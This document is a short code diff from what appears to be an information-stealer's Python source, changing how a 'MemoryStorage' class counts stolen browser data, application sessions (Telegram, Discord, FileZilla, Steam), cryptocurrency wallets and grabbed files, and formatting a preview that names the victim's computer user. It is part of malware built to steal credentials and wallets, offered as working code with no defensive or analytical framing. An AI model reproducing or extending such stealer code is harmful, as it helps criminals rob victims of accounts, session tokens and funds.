@@ -100,18 +100,18 @@ class MemoryStorage:
             elif name in browsers.keys():
                 browsers[name] += value
 
-            elif name in ["Telegram", "Discord", "FileZilla", "Steam"] and value:
-                applications.append(name)
+            elif name == "Application":
+                applications.append(value)
 
-            elif name in ["Wallets"]:
+            elif name == "Wallet":
                 wallets.append(value)
 
-            elif name in ["Grabber"]:
+            elif name == "Grabber":
                 grabbers.append(value)
 
-        applications = ", ".join(applications) if applications else "No applications found"
-        wallets = ", ".join(wallets) if wallets else "No wallets found"
-        grabbers = ", ".join(grabbers) if grabbers else "No grabbed files found"
+        applications = ", ".join(set(applications)) if applications else "No applications found"
+        wallets = ", ".join(set(wallets)) if wallets else "No wallets found"
+        grabbers = ", ".join(set(grabbers)) if grabbers else "No grabbed files found"
 
         preview = dedent(f'''
         🖥️ User: {computer["User"]}
